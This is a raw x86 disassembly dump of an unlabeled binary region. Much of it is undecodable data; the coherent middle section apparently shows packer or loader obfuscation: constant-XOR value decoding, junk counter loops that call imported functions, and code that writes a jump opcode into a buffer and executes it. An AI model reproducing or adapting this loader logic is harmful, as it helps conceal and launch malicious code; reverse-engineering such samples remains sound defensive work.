  406f3d:	cmp    BYTE PTR [edx-0x1],ch
  406f40:	call   0xab476f9a
  406f45:	scas   eax,DWORD PTR es:[edi]
  406f46:	add    DWORD PTR [ebp+0x7b],esp
  406f49:	xor    cl,BYTE PTR [ebx+0x2100035b]
  406f4f:	cmp    eax,esp
  406f51:	pop    ecx
  406f52:	mov    DWORD PTR [ecx-0x7cb07f9],edx
  406f58:	push   cs
  406f59:	stos   DWORD PTR es:[edi],eax
  406f5a:	inc    ebp
  406f5b:	sbb    DWORD PTR [ecx+0xe971ee8],ebx
  406f61:	sub    eax,0xc508f72d
  406f66:	addr16 (bad) 
  406f68:	sti    
  406f69:	cmp    ch,ah
  406f6b:	(bad)  
  406f6c:	mov    esi,0x3f091c9c
  406f71:	mov    bl,0x42
  406f73:	shl    DWORD PTR [esi-0x59],cl
  406f76:	dec    ecx
  406f77:	adc    cl,cl
  406f79:	push   0xf6978b71
  406f7e:	sub    eax,0x62cac021
  406f83:	xor    BYTE PTR [ebx],cl
  406f85:	adc    al,0x88
  406f87:	sbb    cl,BYTE PTR [edx-0x79564440]
  406f8d:	stc    
  406f8e:	aas    
  406f8f:	das    
  406f90:	sub    al,0x68
  406f92:	sub    DWORD PTR [ebx],edi
  406f94:	cmp    BYTE PTR [ecx+ecx*4+0x42],ah
  406f98:	or     al,0x5d
  406f9a:	sbb    al,0x1b
  406f9c:	and    eax,0xdf3c9415
  406fa1:	pop    edx
  406fa2:	ret    
  406fa3:	(bad)  [ebx-0x3b]
  406fa6:	mov    eax,0xa62fcb9a
  406fab:	(bad)  
  406fac:	clc    
  406fad:	push   ds
  406fae:	jl     0x406f85
  406fb0:	aam    0xa9
  406fb2:	dec    eax
  406fb3:	out    0xd2,al
  406fb5:	mov    ch,0x9b
  406fb7:	sub    al,0x98
  406fb9:	ror    BYTE PTR cs:[esi+0x42],cl
  406fbd:	mov    edi,0x1fdb4f6d
  406fc2:	add    ch,BYTE PTR [ebp+0x3]
  406fc5:	push   ecx
  406fc6:	icebp  
  406fc7:	aad    0xd8
  406fc9:	xchg   BYTE PTR [eax+edx*1],ah
  406fcc:	or     DWORD PTR [eax],eax
  406fce:	stos   BYTE PTR es:[edi],al
  406fcf:	(bad)
  406fd2:	nop
  406fd3:	or     ah,bh
  406fd5:	mov    al,0x9d
  406fd7:	sub    al,0xc5
  406fd9:	xor    cl,BYTE PTR [ecx+edx*1+0x2b8fb90]
  406fe0:	xrelease mov DWORD PTR [bp+di-0x51a4],eax
  406fe6:	call   0x426e:0xec8d7741
  406fed:	clc    
  406fee:	imul   ebx,DWORD PTR [ecx-0x27],0x4f2c0329
  406ff5:	xchg   ecx,eax
  406ff6:	dec    ecx
  406ff7:	add    BYTE PTR [ebp+eax*8-0xc],0x4a
  406ffc:	call   0x7e7:0x3dce1e92
  407003:	mov    ecx,ss
  407005:	xchg   BYTE PTR [ecx-0x30d805e5],ch
  40700b:	ins    DWORD PTR es:[edi],dx
  40700c:	xlat   BYTE PTR ds:[ebx]
  40700d:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40700f:	xchg   edi,eax
  407010:	mov    eax,0xc71b1443
  407015:	adc    BYTE PTR [edi+0x3feb8e00],cl
  40701b:	jge    0x406fcc
  40701d:	inc    eax
  40701e:	mov    eax,0xca000d76
  407023:	xchg   BYTE PTR [eax-0x55],bl
  407026:	pop    ss
  407027:	inc    ebx
  407028:	pop    esp
  407029:	loopne 0x40704a
  40702b:	mov    dl,0x60
  40702d:	cmp    al,0x8e
  40702f:	sub    ah,dl
  407031:	aaa    
  407032:	repnz xchg edi,eax
  407034:	loope  0x40707e
  407036:	dec    edi
  407037:	pushf  
  407038:	xlat   BYTE PTR ds:[ebx]
  407039:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40703a:	out    0xef,al
  40703c:	inc    edi
  40703d:	imul   esi,DWORD PTR [ebx+0x5a239f9b],0x3116cc90
  407047:	jnp    0x406fd5
  407049:	lock (bad) [ebx+ebx*4+0x74]
  40704e:	test   al,0x88
  407050:	pop    esi
  407051:	inc    esi
  407052:	jb     0x4070a8
  407054:	jmp    0xabb5a955
  407059:	daa    
  40705a:	outs   dx,DWORD PTR ds:[esi]
  40705b:	mov    al,ds:0x37941862
  407060:	outs   dx,BYTE PTR ds:[esi]
  407061:	cmp    bl,0x2d
  407064:	(bad)  
  407065:	ss inc ebx
  407067:	hlt    
  407068:	mov    esp,0xc17deb7b
  40706d:	adc    esi,DWORD PTR [eax+0x563cae41]
  407073:	xor    DWORD PTR [eax+0x13],esi
  407076:	jbe    0x407067
  407078:	aam    0x6c
  40707a:	je     0x407066
  40707c:	fild   WORD PTR [esi-0x7a]
  40707f:	cmc    
  407080:	inc    edx
  407081:	dec    edx
  407082:	mov    dl,0x59
  407084:	mov    eax,ds:0x6ab65b59
  407089:	or     edx,ecx
  40708b:	xor    esi,edi
  40708d:	lea    ecx,[ebx-0x5bef74ae]
  407093:	xchg   esi,eax
  407094:	xor    ah,cl
  407096:	mov    esi,DWORD PTR [edi]
  407098:	adc    edx,ecx
  40709a:	loopne 0x40703d
  40709c:	(bad)  
  40709d:	jno    0x407109
  40709f:	mov    esp,0x701684ef
  4070a4:	scas   al,BYTE PTR es:[edi]
  4070a5:	dec    edx
  4070a6:	adc    ch,BYTE PTR [esi]
  4070a8:	or     eax,0x6ee2d6e1
  4070ad:	cdq    
  4070ae:	mov    eax,ds:0x8a344e7e
  4070b3:	ins    DWORD PTR es:[edi],dx
  4070b4:	imul   edi,DWORD PTR [ecx+0x47],0xd55f29d6
  4070bb:	fsubr  QWORD PTR [esi]
  4070bd:	int    0x61
  4070bf:	mov    eax,0xeef88229
  4070c4:	loope  0x40711a
  4070c6:	into   
  4070c7:	into   
  4070c8:	shl    BYTE PTR [edx],cl
  4070ca:	retf   
  4070cb:	inc    edx
  4070cc:	xchg   ebp,edx
  4070ce:	mov    edi,0x2b0b3d8f
  4070d3:	test   eax,0xf7f51b6e
  4070d8:	sub    eax,0x61cfeae2
  4070dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070de:	pop    edi
  4070df:	std    
  4070e0:	sbb    eax,0x71b1687
  4070e5:	or     DWORD PTR [eax-0x284258b1],eax
  4070eb:	pop    esp
  4070ec:	and    bh,BYTE PTR [edi]
  4070ee:	fidiv  WORD PTR [ebp+0x4795917c]
  4070f4:	in     eax,dx
  4070f5:	pop    esi
  4070f6:	dec    esi
  4070f7:	add    DWORD PTR [esi-0x3a6a621e],edi
  4070fd:	aad    0x2b
  4070ff:	mov    al,ds:0xcbeb8681
  407104:	xor    eax,0x64ece0bf
  407109:	xor    DWORD PTR [ebx],eax
  40710b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40710c:	fbstp  TBYTE PTR [esi+0x78]
  40710f:	data16 jecxz 0x407127
  407112:	jae    0x4070b6
  407114:	scas   al,BYTE PTR es:[edi]
  407115:	int3   
  407116:	mov    al,ds:0x3a185481
  40711b:	rcl    BYTE PTR [ebp+0x73],cl
  40711e:	mov    ah,0x12
  407120:	sar    esi,cl
  407122:	xchg   ebx,eax
  407123:	shr    DWORD PTR [esi+0x19],cl
  407126:	adc    DWORD PTR [eax-0x3],eax
  407129:	int    0xb1
  40712b:	sbb    eax,0xc00cf7e1
  407130:	(bad)  
  407132:	sub    DWORD PTR ds:0x855534c4,edx
  407138:	sub    DWORD PTR [esi+0x38],ebp
  40713b:	xchg   edi,eax
  40713c:	push   edx
  40713d:	and    dh,BYTE PTR [edi]
  40713f:	jmp    0xdcae3a25
  407144:	mov    dh,0x99
  407146:	inc    BYTE PTR [esi+0x4a8d8c25]
  40714c:	ret    
  40714d:	int3   
  40714e:	cwde   
  40714f:	shr    BYTE PTR [eax],1
  407151:	cmp    al,0x14
  407153:	pop    ecx
  407154:	out    0x53,eax
  407156:	pop    eax
  407157:	int3   
  407158:	jae    0x4071a6
  40715a:	mov    edx,DWORD PTR [ecx+0x28]
  40715d:	pusha  
  40715e:	mov    esi,0x171059f1
  407163:	pop    edx
  407164:	ds jecxz 0x407116
  407167:	xor    bh,dl
  407169:	sbb    bl,bh
  40716b:	inc    ebx
  40716c:	div    DWORD PTR [edx-0x78]
  40716f:	xor    DWORD PTR [edx+edi*4],ecx
  407172:	rcr    BYTE PTR [ebx-0xf667fbc],1
  407178:	jmp    0xbcb8:0xbcac7e63
  40717f:	int3   
  407180:	outs   dx,DWORD PTR ds:[esi]
  407181:	in     eax,0xf5
  407183:	push   esi
  407184:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407185:	pop    ebx
  407186:	dec    ebx
  407187:	jmp    0x68cf:0x6acd6d2a
  40718e:	stc    
  40718f:	sbb    dh,ch
  407191:	inc    eax
  407192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407193:	adc    DWORD PTR [ebp+ecx*1+0x59],esp
  407197:	stc    
  407198:	call   0x55db92e2
  40719d:	pusha  
  40719e:	push   ds
  40719f:	pushf  
  4071a0:	retf   0x6ce0
  4071a3:	and    esi,eax
  4071a5:	in     al,dx
  4071a6:	pop    eax
  4071a7:	js     0x40713b
  4071a9:	add    DWORD PTR [edx-0x77],ebp
  4071ac:	stc    
  4071ad:	adc    BYTE PTR [esi],ch
  4071af:	sub    eax,0xf7dee0db
  4071b4:	cdq    
  4071b5:	stos   BYTE PTR es:[edi],al
  4071b6:	sub    DWORD PTR [ebp+ecx*2-0x54],ecx
  4071ba:	jno    0x4071db
  4071bc:	pop    esi
  4071bd:	shl    BYTE PTR [ebp-0x2bae406b],cl
  4071c3:	retf   0x73d7
  4071c6:	mov    ch,0x7e
  4071c8:	mov    esp,0xa7d9821f
  4071cd:	retf   0x8f37
  4071d0:	dec    eax
  4071d1:	lahf   
  4071d2:	add    bl,BYTE PTR [edx]
  4071d4:	xor    DWORD PTR [ebx-0x7],0x4d61d95c
  4071db:	dec    ebp
  4071dc:	lods   al,BYTE PTR ds:[esi]
  4071dd:	sahf   
  4071de:	and    BYTE PTR [edi+0x2f],dl
  4071e1:	ror    DWORD PTR [esi-0x26f6ece],cl
  4071e7:	pop    ss
  4071e8:	lahf   
  4071e9:	dec    edi
  4071ea:	xor    DWORD PTR [ecx],ecx
  4071ec:	stos   DWORD PTR es:[edi],eax
  4071ed:	sub    edx,edi
  4071ef:	pop    eax
  4071f0:	test   ebp,edi
  4071f2:	ins    DWORD PTR es:[edi],dx
  4071f3:	test   al,0xa4
  4071f5:	ins    BYTE PTR es:[edi],dx
  4071f6:	neg    BYTE PTR [edx+0x4]
  4071f9:	outs   dx,DWORD PTR ds:[esi]
  4071fa:	out    dx,eax
  4071fb:	mov    eax,0x58b32fd
  407200:	gs cmp al,0xe1
  407203:	mov    ds:0xd35d3355,al
  407208:	aas    
  407209:	pop    ecx
  40720a:	inc    eax
  40720b:	fsubr  DWORD PTR ds:0x7b696655
  407211:	out    0x33,eax
  407213:	sar    DWORD PTR [edx+0x3272dd],0x3
  40721a:	ret    0x4589
  40721d:	or     BYTE PTR [ebx-0x3ecc13bb],cl
  407223:	add    eax,edx
  407225:	mov    edx,DWORD PTR [ebp+0x14]
  407228:	imul   eax,DWORD PTR [edx]
  40722b:	mov    edx,DWORD PTR [ebp-0x4]
  40722e:	xor    edx,ecx
  407230:	mov    ecx,DWORD PTR [ebp+0x8]
  407233:	lea    ecx,[edx+ecx*1+0x3272dd]
  40723a:	cmp    ecx,eax
  40723c:	je     0x4072b3
  407242:	mov    edi,DWORD PTR [ebp-0x14]
  407245:	mov    eax,DWORD PTR [ebp+0x8]
  407248:	mov    edx,DWORD PTR [ebp+0x14]
  40724b:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40724f:	mov    ecx,0x7510896
  407254:	xor    edx,edx
  407256:	xor    edi,ecx
  407258:	mov    esi,0x3272dd
  40725d:	add    edi,esi
  40725f:	div    edi
  407261:	mov    edx,DWORD PTR [ebp-0x4]
  407264:	xor    edx,ecx
  407266:	lea    eax,[edx+eax*1+0x3272dd]
  40726d:	mov    edx,DWORD PTR [ebp+0x8]
  407270:	mov    edi,DWORD PTR [ebp-0x20]
  407273:	mov    DWORD PTR [edi+edx*4],eax
  407276:	mov    eax,DWORD PTR [ebp-0x14]
  407279:	mov    edx,DWORD PTR [ebp+0x8]
  40727c:	xor    eax,ecx
  40727e:	lea    eax,[eax+edx*1+0x3272dd]
  407285:	mov    DWORD PTR [ebp+0x8],eax
  407288:	mov    eax,DWORD PTR [ebp-0x14]
  40728b:	mov    edx,DWORD PTR [ebp+0x14]
  40728e:	xor    eax,ecx
  407290:	add    eax,esi
  407292:	imul   eax,DWORD PTR [edx]
  407295:	mov    edx,DWORD PTR [ebp-0x4]
  407298:	xor    edx,ecx
  40729a:	mov    ecx,DWORD PTR [ebp+0x8]
  40729d:	lea    ecx,[edx+ecx*1+0x3272dd]
  4072a4:	cmp    ecx,eax
  4072a6:	jne    0x407242
  4072ac:	mov    eax,esi
  4072ae:	jmp    0x4072b8
  4072b3:	mov    eax,0x3272dd
  4072b8:	mov    ebx,0x7510896
  4072bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4072c0:	xor    ecx,ebx
  4072c2:	add    ecx,eax
  4072c4:	mov    DWORD PTR [ebp-0xc],ecx
  4072c7:	mov    ebx,0x65655
  4072cc:	add    ebx,0x3234
  4072d2:	xchg   ebx,esi
  4072d4:	xor    ebx,ebx
  4072d6:	push   esi
  4072d7:	mov    esi,ebx
  4072d9:	pop    ebx
  4072da:	mov    edx,esi
  4072dc:	add    ebx,0x1002
  4072e2:	lea    eax,[ebp-0x10]
  4072e5:	add    edx,eax
  4072e7:	add    edx,0x5
  4072ea:	push   edx
  4072eb:	inc    esi
  4072ec:	pop    ecx
  4072ed:	dec    ecx
  4072ee:	xchg   ecx,eax
  4072ef:	dec    eax
  4072f0:	xchg   ecx,eax
  4072f1:	dec    ecx
  4072f2:	xchg   ecx,edx
  4072f4:	dec    edx
  4072f5:	push   edx
  4072f6:	mov    edx,ebx
  4072f8:	pop    ebx
  4072f9:	dec    ebx
  4072fa:	call   DWORD PTR [ebx]
  4072fc:	cmp    DWORD PTR [ebp+0x10],esi
  4072ff:	je     0x40731e
  407305:	xchg   edx,eax
  407306:	push   0xb
  407308:	pop    ecx
  407309:	push   0x4
  40730b:	pop    ebx
  40730c:	inc    ebx
  40730d:	xchg   ebx,ecx
  40730f:	sub    ebx,ecx
  407311:	xchg   ebx,ecx
  407313:	dec    ecx
  407314:	dec    ecx
  407315:	mov    eax,DWORD PTR [ebp-0x1c]
  407318:	imul   eax,ecx
  40731b:	add    esp,eax
  40731d:	xchg   edx,eax
  40731e:	push   eax
  40731f:	xor    ebx,ebx
  407321:	mov    edx,esp
  407323:	dec    edx
  407324:	inc    ebx
  407325:	add    ebx,DWORD PTR [edx+ebx*1]
  407328:	dec    ebx
  407329:	xor    edx,edx
  40732b:	add    DWORD PTR [ebp-0xc],ebx
  40732e:	pop    ebx
  40732f:	mov    eax,DWORD PTR [ebp-0xc]
  407332:	pop    edi
  407333:	pop    esi
  407334:	pop    ebx
  407335:	leave  
  407336:	ret    0x10
  407339:	push   ebp
  40733a:	mov    ebp,esp
  40733c:	sub    esp,0x7c
  40733f:	and    DWORD PTR ds:0x420e92,0x0
  407349:	jmp    0x40735b
  40734e:	mov    ecx,DWORD PTR ds:0x420e92
  407354:	inc    ecx
  407355:	mov    DWORD PTR ds:0x420e92,ecx
  40735b:	cmp    DWORD PTR ds:0x420e92,0x15
  407362:	jae    0x4073cc
  407368:	cmp    DWORD PTR ds:0x420e92,0x1f
  40736f:	jne    0x407388
  407375:	push   0x3dd4
  40737a:	push   0x422018
  40737f:	push   DWORD PTR [ebp-0xc]
  407382:	call   DWORD PTR ds:0x4247e5
  407388:	jmp    0x40734e
  40738d:	mov    DWORD PTR ds:0x420f64,0x1c
  407397:	cmp    DWORD PTR ds:0x420f64,0x0
  40739e:	je     0x4073cc
  4073a4:	cmp    DWORD PTR ds:0x420f64,0x1d
  4073ab:	jne    0x4073b7
  4073b1:	call   DWORD PTR ds:0x4247f1
  4073b7:	mov    eax,ds:0x420f64
  4073bc:	dec    eax
  4073bd:	mov    ds:0x420f64,eax
  4073c2:	jmp    0x407397
  4073c7:	adc    eax,0x653
  4073cc:	push   esi
  4073cd:	and    DWORD PTR ds:0x42200c,0x0
  4073d7:	jmp    0x4073e9
  4073dc:	mov    esi,DWORD PTR ds:0x42200c
  4073e2:	inc    esi
  4073e3:	mov    DWORD PTR ds:0x42200c,esi
  4073e9:	cmp    DWORD PTR ds:0x42200c,0x16
  4073f0:	jae    0x40742e
  4073f6:	cmp    DWORD PTR ds:0x42200c,0xa
  4073fd:	jne    0x407409
  407403:	call   DWORD PTR ds:0x4247f5
  407409:	cmp    DWORD PTR ds:0x42200c,0x9
  407410:	jne    0x407423
  407416:	mov    esi,DWORD PTR ds:0x42200c
  40741c:	inc    esi
  40741d:	mov    DWORD PTR ds:0x42200c,esi
  407423:	jmp    0x4073dc
  407428:	sbb    DWORD PTR ds:0x420f00,edx
  40742e:	push   edi
  40742f:	mov    eax,ds:0x424435
  407434:	mov    DWORD PTR ds:0x420f70,0x12
  40743e:	cmp    DWORD PTR ds:0x420f70,0x0
  407445:	je     0x40748b
  40744b:	cmp    DWORD PTR ds:0x420f70,0x17
  407452:	jne    0x407479
  407458:	push   0x87b3
  40745d:	push   DWORD PTR [ebp-0x28]
  407460:	push   0x420f68
  407465:	push   0x7b70
  40746a:	push   DWORD PTR [ebp-0x18]
  40746d:	push   DWORD PTR [ebp-0x24]
  407470:	push   DWORD PTR [ebp-0x14]
  407473:	call   DWORD PTR ds:0x4247f9
  407479:	mov    edi,DWORD PTR ds:0x420f70
  40747f:	dec    edi
  407480:	mov    DWORD PTR ds:0x420f70,edi
  407486:	jmp    0x40743e
  40748b:	mov    DWORD PTR [ebp-0x24],eax
  40748e:	mov    eax,ds:0x424541
  407493:	xor    esi,edi
  407495:	mov    DWORD PTR [ebp-0x34],eax
  407498:	and    edi,DWORD PTR ds:0x420f5c
  40749e:	and    DWORD PTR [ebp-0x30],0x0
  4074a2:	and    eax,edi
  4074a4:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  4074ab:	adc    DWORD PTR ds:0x420ef0,edx
  4074b1:	mov    DWORD PTR [ebp-0x28],0xf89c85b2
  4074b8:	mov    edi,DWORD PTR ds:0x420ec2
  4074be:	mov    eax,ds:0x420f7c
  4074c3:	sub    edi,eax
  4074c5:	sub    edi,DWORD PTR [edi+eax*1]
  4074c8:	mov    eax,DWORD PTR [ebp-0x10]
  4074cb:	or     edi,0x1b5b
  4074d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4074d4:	and    DWORD PTR ds:0x420ea2,0x0
  4074de:	xor    esi,esi
  4074e0:	xor    esi,DWORD PTR ds:0x420ea2
  4074e6:	inc    esi
  4074e7:	mov    DWORD PTR ds:0x420ea2,esi
  4074ed:	cmp    DWORD PTR ds:0x420ea2,0x20
  4074f4:	jne    0x407508
  4074fa:	push   DWORD PTR [ebp-0x28]
  4074fd:	push   0x424093
  407502:	call   DWORD PTR ds:0x4247fd
  407508:	cmp    DWORD PTR ds:0x420ea2,0x19
  40750f:	jb     0x4074de
  407515:	sub    eax,ecx
  407517:	and    DWORD PTR ds:0x420fac,0x0
  407521:	xor    ecx,ecx
  407523:	or     ecx,DWORD PTR ds:0x420fac
  407529:	inc    ecx
  40752a:	mov    DWORD PTR ds:0x420fac,ecx
  407530:	cmp    DWORD PTR ds:0x420fac,0x5
  407537:	jne    0x407550
  40753d:	push   0x42414e
  407542:	push   0x0
  407544:	push   DWORD PTR [ebp-0x28]
  407547:	push   DWORD PTR [ebp-0x10]
  40754a:	call   DWORD PTR ds:0x424801
  407550:	cmp    DWORD PTR ds:0x420fac,0x4
  407557:	jne    0x40756a
  40755d:	mov    ecx,DWORD PTR ds:0x420fac
  407563:	inc    ecx
  407564:	mov    DWORD PTR ds:0x420fac,ecx
  40756a:	cmp    DWORD PTR ds:0x420fac,0x16
  407571:	jb     0x407521
  407577:	and    DWORD PTR ds:0x420f9c,0x0
  407581:	jmp    0x407593
  407586:	mov    ecx,DWORD PTR ds:0x420f9c
  40758c:	inc    ecx
  40758d:	mov    DWORD PTR ds:0x420f9c,ecx
  407593:	cmp    DWORD PTR ds:0x420f9c,0x11
  40759a:	jae    0x4075dc
  4075a0:	cmp    DWORD PTR ds:0x420f9c,0x5
  4075a7:	jne    0x4075bd
  4075ad:	push   0x420f74
  4075b2:	push   0x1cd6
  4075b7:	call   DWORD PTR ds:0x424805
  4075bd:	cmp    DWORD PTR ds:0x420f9c,0x4
  4075c4:	jne    0x4075d7
  4075ca:	mov    ecx,DWORD PTR ds:0x420f9c
  4075d0:	inc    ecx
  4075d1:	mov    DWORD PTR ds:0x420f9c,ecx
  4075d7:	jmp    0x407586
  4075dc:	mov    DWORD PTR [ebp-0x10],eax
  4075df:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  4075e6:	mov    eax,DWORD PTR [ebp-0x18]
  4075e9:	mov    ecx,DWORD PTR [ebp-0x18]
  4075ec:	sub    eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x18],eax
  4075f1:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4075f8:	mov    eax,DWORD PTR [ebp-0xc]
  4075fb:	mov    ecx,DWORD PTR [ebp-0xc]
  4075fe:	sub    eax,ecx
  407600:	mov    DWORD PTR [ebp-0xc],eax
  407603:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  40760a:	mov    eax,DWORD PTR [ebp-0x1c]
  40760d:	mov    ecx,DWORD PTR [ebp-0x1c]
  407610:	sub    eax,ecx
  407612:	mov    DWORD PTR [ebp-0x1c],eax
  407615:	or     DWORD PTR [ebp-0x1c],0xf89c85d5
  40761c:	mov    eax,DWORD PTR [ebp-0x20]
  40761f:	mov    ecx,DWORD PTR [ebp-0x20]
  407622:	sub    eax,ecx
  407624:	mov    DWORD PTR [ebp-0x20],eax
  407627:	mov    eax,DWORD PTR [ebp-0x2c]
  40762a:	mov    ecx,DWORD PTR [ebp-0x20]
  40762d:	mov    esi,0x7510896
  407632:	xor    eax,esi
  407634:	mov    edi,0x3272dd
  407639:	add    eax,edi
  40763b:	or     eax,ecx
  40763d:	mov    DWORD PTR [ebp-0x20],eax
  407640:	mov    eax,DWORD PTR [ebp-0x4]
  407643:	mov    ecx,DWORD PTR [ebp-0x4]
  407646:	sub    eax,ecx
  407648:	mov    DWORD PTR [ebp-0x4],eax
  40764b:	or     DWORD PTR [ebp-0x4],0xf89c85be
  407652:	mov    eax,DWORD PTR [ebp-0xc]
  407655:	xor    eax,esi
  407657:	add    eax,edi
  407659:	push   eax
  40765a:	mov    eax,DWORD PTR [ebp-0x10]
  40765d:	xor    eax,esi
  40765f:	add    eax,edi
  407661:	push   eax
  407662:	mov    eax,DWORD PTR [ebp-0x4]
  407665:	xor    eax,esi
  407667:	add    eax,edi
  407669:	push   eax
  40766a:	lea    eax,[ebp-0x7c]
  40766d:	push   eax
  40766e:	push   DWORD PTR [ebp-0x2c]
  407671:	push   DWORD PTR [ebp-0x28]
  407674:	call   0x410b90
  407679:	test   eax,eax
  40767b:	je     0x4076a9
  407681:	lea    eax,[ebp-0x7c]
  407684:	push   eax
  407685:	mov    eax,DWORD PTR [ebp-0x28]
  407688:	xor    eax,esi
  40768a:	add    eax,edi
  40768c:	push   eax
  40768d:	mov    eax,DWORD PTR [ebp-0x24]
  407690:	add    eax,0xaa
  407695:	push   eax
  407696:	mov    eax,DWORD PTR [ebp-0x24]
  407699:	mov    eax,DWORD PTR [eax+0x198]
  40769f:	push   DWORD PTR [eax]
  4076a1:	call   0x402470
  4076a6:	mov    DWORD PTR [ebp-0x14],eax
  4076a9:	lea    eax,[ebp+0x4]
  4076ac:	mov    DWORD PTR [ebp-0x30],eax
  4076af:	mov    eax,DWORD PTR [ebp-0x14]
  4076b2:	test   eax,eax
  4076b4:	je     0x40771c
  4076ba:	lea    eax,[ebp-0x8]
  4076bd:	mov    DWORD PTR [ebp-0x38],eax
  4076c0:	mov    eax,DWORD PTR [ebp-0x34]
  4076c3:	mov    DWORD PTR [ebp-0x8],eax
  4076c6:	mov    eax,DWORD PTR [ebp-0x8]
  4076c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4076cc:	sub    eax,ecx
  4076ce:	mov    DWORD PTR [ebp-0x8],eax
  4076d1:	mov    ecx,DWORD PTR [ebp-0x4]
  4076d4:	xor    ecx,esi
  4076d6:	mov    eax,0xffcd8d23
  4076db:	sub    eax,ecx
  4076dd:	add    DWORD PTR [ebp-0x8],eax
  4076e0:	mov    eax,DWORD PTR [ebp-0x8]
  4076e3:	mov    ecx,DWORD PTR [ebp-0x14]
  4076e6:	mov    DWORD PTR [ecx+0x1],eax
  4076e9:	mov    eax,DWORD PTR [ebp-0x14]
  4076ec:	push   DWORD PTR [ebp-0x24]
  4076ef:	mov    BYTE PTR [eax],0xe9
  4076f2:	mov    eax,ds:0x4242b1
  4076f7:	push   DWORD PTR [eax]
  4076f9:	push   DWORD PTR ds:0x42450d
  4076ff:	push   DWORD PTR ds:0x4242b9
  407705:	push   DWORD PTR ds:0x4244ed
  40770b:	push   DWORD PTR ds:0x4245a5
  407711:	push   DWORD PTR [ebp-0x28]
  407714:	push   DWORD PTR [ebp-0x2c]
  407717:	mov    eax,DWORD PTR [ebp-0x14]
  40771a:	call   eax
  40771c:	mov    eax,DWORD PTR [ebp-0x30]
  40771f:	mov    ecx,DWORD PTR ds:0x4244b1
  407725:	add    DWORD PTR [eax],ecx
  407727:	pop    edi
  407728:	pop    esi
  407729:	leave  
  40772a:	ret    
  40772b:	push   ebp
  40772c:	mov    ebp,esp
  40772e:	sub    esp,0x18
  407731:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  407738:	lea    eax,[ebp+0x14]
  40773b:	mov    DWORD PTR [ebp-0x4],eax
  40773e:	jmp    0x409ab8
  407743:	das    
  407744:	or     DWORD PTR [eax+0x13b778ea],edx
  40774a:	mov    esp,DWORD PTR [esi-0x10]
  40774d:	in     eax,0x6d
  40774f:	hlt    
  407750:	cs xchg esi,eax
  407752:	sahf   
  407753:	call   0x7a5f:0x197a7a20
  40775a:	jp     0x40770f
  40775c:	les    ecx,FWORD PTR [esi+0x5e]
  40775f:	retf   0x9a9e
  407762:	xor    DWORD PTR [edi],edx
  407764:	ja     0x407780
  407766:	sub    DWORD PTR [ebx+esi*1-0x1b],edi
  40776a:	loopne 0x40773b
  40776c:	mov    bh,0xf
  40776e:	sub    DWORD PTR [edx],esp
  407770:	adc    BYTE PTR [esi-0x4f],0x78
  407774:	fbld   TBYTE PTR [ecx+0x43]
  407777:	sbb    bl,al
  407779:	mov    edi,0xbf294a15
  40777e:	fistp  WORD PTR [ecx-0x68f98cd3]
  407784:	push   es
  407785:	jl     0x4077d7
  407787:	clc    
  407788:	sbb    edi,ebp
  40778a:	add    eax,0x280e4d1c
  407790:	adc    bh,BYTE PTR [ecx]
  407792:	xor    DWORD PTR [ebx],0xb154624c
  407798:	(bad)  
  40779a:	add    BYTE PTR [ebp-0x29199b6],0x1
  4077a1:	ja     0x407730
  4077a3:	out    dx,eax
  4077a4:	neg    dl
  4077a6:	jg     0x4077b0
  4077a8:	mov    cl,0xf3
  4077aa:	rcr    BYTE PTR [eax],1
  4077ac:	add    al,0x2e
  4077ae:	mov    edi,0x5ace3627
  4077b3:	jae    0x4077b1
  4077b5:	aaa    
  4077b6:	pop    ss
  4077b7:	out    0xab,al
  4077b9:	or     bl,BYTE PTR [eax-0x5e]
  4077bc:	(bad)  
  4077bd:	aad    0x54
  4077bf:	push   es
  4077c0:	cs mov esi,0x3a0581f3
  4077c6:	imul   edi,DWORD PTR [esi],0xf5dfe10d
  4077cc:	or     al,0x57
  4077ce:	xor    dl,BYTE PTR [edi-0xb]
  4077d1:	sub    dl,BYTE PTR [esi-0x3d]
  4077d4:	sbb    al,0xb2
  4077d6:	mov    cs,eax
  4077d8:	neg    BYTE PTR [ebp-0xe9ffd37]
  4077de:	or     eax,0xf984f6e3
  4077e3:	xchg   esp,eax
  4077e4:	call   0x1d3a:0xea154866
  4077eb:	mov    eax,0xfe499da3
  4077f0:	xor    bl,BYTE PTR [ebx+0x23e387b0]
  4077f6:	repnz add eax,0xc54926e7
  4077fc:	lahf   
  4077fd:	push   ds
  4077fe:	sbb    DWORD PTR [ebx+0x43],eax
  407801:	cmp    cl,BYTE PTR ds:0xdd9e91a0
  407807:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407808:	icebp  
  407809:	jge    0x407867
  40780b:	and    dl,cl
  40780d:	lds    esi,FWORD PTR [eax-0x5]
  407810:	push   cs
  407811:	dec    ecx
  407812:	add    eax,0x7f6e38fc
  407817:	idiv   DWORD PTR ds:0x69e5d29e
  40781d:	data16 fdiv DWORD PTR [esi-0x3a]
  407821:	mov    WORD PTR [esi],cs
  407823:	xchg   DWORD PTR [eax],ecx
  407825:	lock or DWORD PTR [eax-0x2a],0xd4e18afa
  40782d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40782e:	push   ecx
  40782f:	int    0x88
  407831:	fadd   DWORD PTR [ebx+0x70933d0e]
  407837:	jns    0x4077ff
  407839:	sbb    BYTE PTR [ecx],0xc7
  40783c:	cdq    
  40783d:	ja     0x40780e
  40783f:	sbb    ecx,DWORD PTR [ebp-0x1ad6b5fb]
  407845:	pop    edx
  407846:	sub    eax,0xefa069bd
  40784b:	push   es
  40784c:	test   BYTE PTR [ecx],ah
  40784e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40784f:	or     al,0x95
